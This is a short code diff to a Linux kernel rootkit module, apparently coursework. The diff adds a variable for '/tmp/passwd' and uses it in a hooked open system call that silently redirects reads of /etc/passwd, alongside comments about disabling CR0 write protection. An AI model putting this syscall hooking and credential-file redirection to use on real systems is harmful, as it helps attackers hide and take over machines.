@@ -20,6 +20,7 @@ struct linux_dirent
 static char *processname = "sneaky_process";
 static char proc_dir[50] = "/proc/";
 static char *etc_passwd = "/etc/passwd";
+static char *tmp_passwd = "/tmp/passwd";
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -88,7 +89,7 @@ asmlinkage int sneaky_sys_open(const char *filename, int flags, int mode) {
   
   if (strcmp(filename, etc_passwd) == 0 )
   {
-    return (*original_open)("/tmp/passwd", flags, mode);
+    return (*original_open)(tmp_passwd, flags, mode);
   } else {
     return (*original_open)(filename, flags, mode);
   }
